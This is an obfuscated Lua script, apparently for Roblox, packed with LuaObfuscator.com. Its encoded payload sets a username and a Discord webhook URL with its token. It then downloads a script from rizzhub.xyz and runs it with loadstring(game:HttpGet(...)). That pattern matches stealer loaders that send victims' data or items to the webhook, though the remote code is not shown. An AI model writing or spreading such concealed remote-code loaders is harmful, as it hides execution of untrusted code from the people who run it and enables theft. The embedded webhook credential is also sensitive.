--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v68=0;local v69;while true do if (v68==0) then v69=v2(v0(v30,16));if v19 then local v96=v5(v69,v19);v19=nil;return v96;else return v69;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v70=(v31/((3 -1)^(v32-(3 -2))))%((1 + 1)^(((v33-(1 + 0)) -(v32-(1 + 0))) + 1)) ;return v70-(v70%((2379 -(873 + 139)) -((444 -211) + 1133))) ;else local v71=2^(v32-(1 + 0)) ;return (((v31%(v71 + v71))>=v71) and (1 + 0)) or (0 -0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (4 -2) );v18=v18 + 1 + 1 ;return (v36 * (988 -732)) + v35 ;end local function v23()local v37=0 + 0 ;local v38;local v39;local v40;local v41;while true do if (((1648 -(648 + 100)) -((1405 -679) + 174))==v37) then v38,v39,v40,v41=v1(v16,v18,v18 + 1 + 2 );v18=v18 + 1 + 3 ;v37=1 + 0 ;end if (v37==(1 + 0)) then return (v41 * ((16779429 -(779 + 31)) -(556 + 847))) + (v40 * (65875 -(178 + 161))) + (v39 * (507 -(124 + 127))) + v38 ;end end end local function v24()local v42=v23();local v43=v23();local v44=1 + (222 -(146 + 76)) ;local v45=(v20(v43,1 + 0 ,20) * (((327 -(138 + 188)) + 1 + 0)^(2 + 30))) + v42 ;local v46=v20(v43,37 -16 ,31);local v47=((v20(v43,32)==(1 + 0)) and  -(1 + 0)) or (1 -0) ;if (v46==(1178 -(641 + 537))) then if (v45==(0 + 0)) then return v47 * 0 ;else v46=2 -1 ;v44=0 + 0 ;end elseif (v46==(5753 -3706)) then return ((v45==(0 -0)) and (v47 * ((1479 -(935 + 543))/0))) or (v47 * NaN) ;end return v8(v47,v46-((2228 -1249) + 44) ) * (v44 + (v45/((1 + 1)^(47 + 5)))) ;end local function v25(v48)local v49;if  not v48 then v48=v23();if (v48==(0 -0)) then return "";end end v49=v3(v16,v18,(v18 + v48) -(2 -1) );v18=v18 + v48 ;local v50={};for v66=607 -(423 + 183) , #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=423 -(261 + 162) ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51~=(0 + 0)) then else v52=317 -(189 + 128) ;v53=nil;v51=190 -(140 + 49) ;end if (v51~=(1 + 1)) then else v56=nil;v57=nil;v51=1 + 2 ;end if (v51==(1342 -(1029 + 310))) then v58=nil;while true do local v76=0;while true do if (v76~=(1 + 0)) then else if (v52~=1) then else local v101=0;local v102;while true do if (v101==0) then v102=0 -0 ;while true do if (v102~=2) then else v52=2;break;end if (v102==0) then local v113=0 + 0 ;while true do if (v113~=1) then else v102=1;break;end if (v113==(0 -0)) then v57=v23();v58={};v113=1 -0 ;end end end if (v102==1) then local v114=0;while true do if (v114==1) then v102=2;break;end if (v114~=(1188 -(799 + 389))) then else for v133=1,v57 do local v134=475 -(298 + 177) ;local v135;local v136;local v137;while true do if (v134==1) then v137=nil;while true do if (v135==(1 + 0)) then if (v136==(605 -(543 + 61))) then v137=v21()~=0 ;elseif (v136==(1412 -(739 + 671))) then v137=v24();elseif (v136==(7 -4)) then v137=v25();end v58[v133]=v137;break;end if (v135~=(0 + 0)) then else local v163=1731 -(1565 + 166) ;while true do if (v163==1) then v135=1897 -(782 + 1114) ;break;end if (v163==(0 + 0)) then v136=v21();v137=nil;v163=1;end end end end break;end if (v134~=0) then else v135=1487 -(562 + 925) ;v136=nil;v134=750 -(83 + 666) ;end end end v56[626 -(456 + 167) ]=v21();v114=1;end end end end break;end end end break;end if (0~=v76) then else if (v52~=2) then else local v103=0;while true do if (v103~=(4 -3)) then else for v105=1,v23() do v55[v105]=v23();end return v56;end if (v103~=0) then else for v107=3 -2 ,v23() do local v108=1749 -(191 + 1558) ;local v109;local v110;while true do if ((332 -(258 + 73))~=v108) then else while true do if (v109~=(0 + 0)) then else v110=v21();if (v20(v110,1,1 + 0 )~=0) then else local v144=0;local v145;local v146;local v147;local v148;local v149;local v150;while true do if (v144~=(2 + 0)) then else v149=nil;v150=nil;v144=1591 -(146 + 1442) ;end if (v144~=(1 + 2)) then else while true do if (v145==(0 + 0)) then local v164=0 + 0 ;while true do if (v164==(0 + 0)) then v146=1998 -(223 + 1775) ;v147=nil;v164=1;end if (v164~=(1 + 0)) then else v145=1;break;end end end if (v145==2) then v150=nil;while true do if (v146==0) then local v171=0 -0 ;local v172;while true do if (v171~=0) then else v172=0 -0 ;while true do if (v172~=(993 -(419 + 574))) then else local v187=0 -0 ;while true do if ((1618 -(578 + 1040))~=v187) then else v147=0 -0 ;v148=nil;v187=1;end if (v187==(1 -0)) then v172=1;break;end end end if (1~=v172) then else v146=1;break;end end break;end end end if (v146==(3 -1)) then while true do if ((1740 -(578 + 1162))~=v147) then else local v174=0 -0 ;local v175;while true do if (v174~=0) then else v175=0 -0 ;while true do if ((847 -(185 + 662))~=v175) then else local v188=0 + 0 ;while true do if (v188==(0 + 0)) then local v192=0;while true do if ((1 + 0)==v192) then v188=413 -(170 + 242) ;break;end if (v192~=0) then else v148=v20(v110,2,1762 -(285 + 1474) );v149=v20(v110,4,6);v192=1;end end end if (1==v188) then v175=1;break;end end end if (v175~=1) then else v147=1 + 0 ;break;end end break;end end end if (v147~=(2 -1)) then else local v176=0;local v177;while true do if (v176==0) then v177=0;while true do if (v177~=1) then else v147=517 -(100 + 415) ;break;end if (v177==(0 -0)) then local v189=1774 -(959 + 815) ;local v190;while true do if (v189==(0 -0)) then v190=0;while true do if (v190~=1) then else v177=1;break;end if (v190~=0) then else v150={v22(),v22(),nil,nil};if (v148==0) then local v197=0;while true do if ((0 + 0)~=v197) then else v150[3]=v22();v150[7 -3 ]=v22();break;end end elseif (v148==(1564 -(106 + 1457))) then v150[3]=v23();elseif (v148==2) then v150[1311 -(174 + 1134) ]=v23() -(2^(9 + 7)) ;elseif (v148~=3) then else local v202=0;local v203;local v204;local v205;while true do if (v202==(0 -0)) then v203=0 -0 ;v204=nil;v202=1;end if (v202==(3 -2)) then v205=nil;while true do if (v203~=1) then else while true do if (v204==(0 -0)) then v205=0;while true do if ((1462 -(960 + 502))~=v205) then else v150[3]=v23() -(2^(37 -21)) ;v150[4]=v22();break;end end break;end end break;end if (v203==0) then local v206=393 -(144 + 249) ;while true do if (v206==(0 -0)) then v204=0;v205=nil;v206=1;end if (v206==1) then v203=1;break;end end end end break;end end end v190=3 -2 ;end end break;end end end end break;end end end if (v147~=(2 + 0)) then else local v178=743 -(70 + 673) ;local v179;while true do if (v178~=(0 -0)) then else v179=0;while true do if (v179==0) then local v191=0;while true do if ((1539 -(416 + 1123))~=v191) then else if (v20(v149,1,1)~=1) then else v150[2 + 0 ]=v58[v150[2]];end if (v20(v149,972 -(531 + 439) ,3 -1 )~=(1 -0)) then else v150[1876 -(1814 + 59) ]=v58[v150[12 -9 ]];end v191=1 + 0 ;end if (v191==1) then v179=246 -(84 + 161) ;break;end end end if (v179==(1 -0)) then v147=8 -5 ;break;end end break;end end end if (v147~=3) then else if (v20(v149,3,3)~=(2 -1)) then else v150[10 -6 ]=v58[v150[4]];end v53[v107]=v150;break;end end break;end if (v146==(1 -0)) then v149=nil;v150=nil;v146=2 + 0 ;end end break;end if (v145~=1) then else v148=nil;v149=nil;v145=258 -(56 + 200) ;end end break;end if (v144==(1846 -(417 + 1428))) then v147=nil;v148=nil;v144=1 + 1 ;end if (0==v144) then v145=0;v146=nil;v144=1;end end end break;end end break;end if (v108~=(0 + 0)) then else v109=1389 -(959 + 430) ;v110=nil;v108=1 + 0 ;end end end for v111=229 -(110 + 118) ,v23() do v54[v111-1 ]=v28();end v103=1;end end end if (v52==(0 -0)) then v53={};v54={};v55={};v56={v53,v54,nil,v55};v52=1;end v76=1;end end end break;end if (v51~=1) then else local v72=0;while true do if (v72~=(0 + 0)) then else v54=nil;v55=nil;v72=1;end if (v72==1) then v51=2 -0 ;break;end end end end end local function v29(v59,v60,v61)local v62=0;local v63;local v64;local v65;while true do if (v62==0) then v63=v59[1];v64=v59[2];v62=1;end if (v62==1) then v65=v59[3];return function(...)local v77=1;local v78= -1;local v79={...};local v80=v12("#",...) -1 ;local function v81()local v82=v63;local v83=v64;local v84=v65;local v85=v27;local v86={};local v87={};local v88={};for v92=0 + 0 ,v80 do if ((v92>=v84) or ((6163 -(1223 + 107))<(976 -(81 + 409)))) then v86[v92-v84 ]=v79[v92 + (1 -(0 + 0)) ];else v88[v92]=v79[v92 + (1675 -(1153 + 521)) ];end end local v89=(v80-v84) + (1150 -(137 + 1012)) ;local v90;local v91;while true do local v93=0;local v94;while true do if (((17498 -12574)>=(315 + 2234)) and (v93==(0 -0))) then v94=0 + 0 ;while true do if (((323 + 1391)>(773 + 79)) and (v94==(4 -3))) then if ((v91<=(2 + 2)) or ((3283 + 634)>4191)) then if (((4187 -(1078 + 630))<=3994) and (v91<=(1 + 0))) then if (((11044 -6243)>=((6047 -(785 + 439)) -(519 + 922))) and (v91>((1384 -(994 + 390)) + 0))) then v88[v90[5 -3 ]]=v90[(1452 -(785 + 665)) + 1 ];else local v120=0 + 0 ;local v121;local v122;while true do if ((v120==((1 + 1) -1)) or ((4019 -(1261 + 592))>(6636 -(1064 + 329 + 312)))) then while true do if (((7735 -5871)>1840) and (v121==((2376 -(282 + 1522)) -(378 + 194)))) then v122=v90[483 -((1802 -(138 + 1314)) + 117 + 14) ];v88[v122]=v88[v122](v13(v88,v122 + 1 + 0 ,v78));break;end end break;end if ((v120==(0 + 0)) or ((14641 -11186)<=(1324 -(849 + 289)))) then local v151=1570 -(176 + 1394) ;while true do if ((v151==(3 -2)) or ((2113 + 967)<(8610 -5671))) then v120=1 + 0 ;break;end if (((5022 -(339 + 980))>(930 + 890)) and ((836 -(7 + 829))==v151)) then v121=0 + 0 ;v122=nil;v151=942 -(557 + 384) ;end end end end end elseif ((v91<=(389 -(127 + 260))) or ((5189 -1907)==(1956 -(8 + 4 + 0)))) then local v123=0;local v124;local v125;local v126;local v127;local v128;local v129;while true do if ((4766==(1106 + 3660)) and (v123==(121 -(92 + 27)))) then v128=nil;v129=nil;v123=3;end if ((v123==(1 + (1669 -(1068 + 599)))) or ((1205 + 3474)==4393)) then while true do if (((2554 -(414 + 178))<((3148 -1992) + (7601 -3831))) and (v124==(1994 -(935 + 1058)))) then local v159=(1389 -(897 + 492)) + 0 ;while true do if (((1622 + 1137)<=3718) and (v159==((3831 -2367) -(1238 + 225)))) then v124=3 -1 ;break;end if (((3941 + 726)>((2702 -1267) + 2193)) and (v159==(0 + 0))) then v127=nil;v128=nil;v159=1 -0 ;end end end if ((3581==(5347 -(791 + (1515 -(432 + 108))))) and (v124==((721 -(604 + 117)) -0))) then v125=0 -0 ;v126=nil;v124=1 -0 ;end if (((1033 + 1151)>(606 + 1059)) and (v124==(4 -2))) then v129=nil;while true do if ((1228<(3934 -(181 + 195))) and (v125==(2 + 0))) then for v168=v126,v78 do local v169=(2195 -(35 + 1167)) -(615 + 378) ;local v170;while true do if (((0 -0)==v169) or (4360<(1116 + 1853))) then v170=0;while true do if ((0==v170) or ((62 + 19 + 1640)<=1605)) then v129=v129 + (3 -2) ;v88[v168]=v127[v129];break;end end break;end end end break;end if ((v125==(1 + 0)) or (1039>((4726 -(186 + 101)) -2583))) then local v165=0;local v166;while true do if (((3321 -2056)<(3386 + 721 + 16)) and (v165==(0 + 0))) then v166=0 -0 ;while true do if ((v166==(1720 -(287 + 1432))) or ((2318 -(1045 + 510))>=((3557 -(141 + 361)) -2150))) then v125=2;break;end if (((3902 + 67)>=248) and (v166==(1100 -(764 + 336)))) then local v181=0;while true do if ((4917>((2892 -1775) + (2416 -(1354 + 264)))) and (v181==(0 -0))) then v78=(v128 + v126) -1 ;v129=0 + 0 + 0 ;v181=1 + 0 ;end if ((v181==(1 + 0)) or ((5472 -2633)>=3926)) then v166=343 -(10 + 332) ;break;end end end end break;end end end if ((v125==(1570 -(675 + 895))) or ((12043 -(581 + 6951))<=(985 -526))) then local v167=575 -((161 -54) + 468) ;while true do if (((1035 + 1605)<=(4057 -((1833 -(1432 + 342)) + 1289))) and (v167==(0 + 0 + 0))) then local v173=0 + 0 ;while true do if (((118 -56)==(144 -82)) and (v173==((6508 -4686) -(1094 + 728)))) then v126=v90[1405 -((1967 -(713 + 601)) + 750) ];v127,v128=v85(v88[v126](v13(v88,v126 + 1 ,v90[123 -(85 + (1110 -(506 + 569))) ])));v173=1;end if (((2 -(2 -1))==v173) or ((55 + 7 + (4528 -(413 + 293)))==(5740 -(602 + 455)))) then v167=2 -1 ;break;end end end if ((2365>(2939 -1861)) and ((2 -1)==v167)) then v125=3 -2 ;break;end end end end break;end end break;end if ((v123==(1 + 0)) or (3854==(4582 -1710))) then v126=nil;v127=nil;v123=(3 + 0) -1 ;end if ((v123==0) or ((8953 -6641)>=(10973 -7261))) then v124=0 -0 ;v125=nil;v123=298 -(147 + 150) ;end end elseif (((160 + 273)<=(3395 -1195)) and (v91>3)) then v88[v90[7 -5 ]]=v90[197 -(184 + 10) ]~=(920 -(512 + 408)) ;else v61[v90[3]]=v88[v90[4 -2 ]];end elseif (((1220 -542)<=3053) and (v91<=(1 + 6))) then if ((v91<=(15 -10)) or ((3389 -1568)>2836)) then do return;end elseif (((50 + 109)<(3688 -(27 + 110))) and (v91==(1 + 5))) then v88[v90[2]]=v61[v90[390 -(106 + 281) ]];elseif (((4493 -(222 + 231))<=(6092 -(417 + 955 + 108))) and (v88[v90[5 -(1857 -(170 + 1684)) ]]==v90[1 + 3 ])) then v77=v77 + 1 + 0 ;else v77=v90[3];end elseif (((433 -227)<(1982 -(284 + 229))) and (v91<=(793 -(344 + 441)))) then local v130=(0 + 0) -0 ;local v131;local v132;while true do if ((v130==(0 -0)) or (2062>=(4784 -((2011 -(1892 + 77)) + 434)))) then local v152=0 -0 ;while true do if ((2098>(649 -433)) and (v152==0)) then v131=v90[(491 -(312 + 177)) -0 ];v132=v88[v90[3 + 0 + 0 ]];v152=1751 -(726 + 1024) ;end if ((v152==(391 -(310 + 80))) or ((1339 + 910)>=3720)) then v130=3 -2 ;break;end end end if (((2 -1)==v130) or ((14152 -9499)>=(6841 -(1532 + 307 + 17)))) then v88[v131 + ((1 + 1) -1) ]=v132;v88[v131]=v132[v90[4]];break;end end elseif ((2711<(6194 -(237 + 1479))) and (v91>9)) then v77=v90[3];else v88[v90[8 -6 ]]();end v77=v77 + 1 + 0 ;break;end if (((460 + 204)>(39 + (436 -(99 + 327)))) and (v94==(0 -0))) then local v104=0 + 0 ;while true do if (((1804 -((3372 -(357 + 1555)) + 344))==v104) or ((1637 -(868 + 266))>=4050)) then v90=v82[v77];v91=v90[1602 -(116 + 1485) ];v104=(307 -(159 + 40)) -(75 + (1246 -(115 + 1099))) ;end if ((v104==1) or ((2794 -(228 + 921))>=(3808 -(445 + 543)))) then v94=1 + 0 ;break;end end end end break;end end end end A,B=v27(v11(v81));if  not A[1] then local v95=v59[4][v77] or "?" ;error("Script error at ["   .. v95   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end end end return v29(v28(),{},v17)(...);end v15("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403243O00682O7470733A2O2F72692O7A6875622E78797A2F736372697074732F4D61696E2E6C756103083O00557365724E616D65030B3O00706177656C70726F31306B03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130393238373337322O3936323432363432382F50766C52646A4B6631634B4748564779494C76755545693742774E356E684F4164554B316A787A34786B4B48534F586A7459434D32384B5A5246536869496D6B3572316600153O0012013O00013O0026073O000C0001000200040A3O000C0001001206000100033O001206000200043O002008000200020005001201000400064O0004000500014O0002000200056O00013O00022O000900010001000100040A3O001400010026073O00010001000100040A3O00010001001201000100083O001203000100073O0012010001000A3O001203000100093O0012013O00023O00040A3O000100012O00053O00017O00153O00023O00043O00043O00053O00053O00053O00053O00053O00053O00053O00053O00063O00083O00083O00093O00093O000A3O000A3O000B3O000C3O000E3O00",v9(),...);end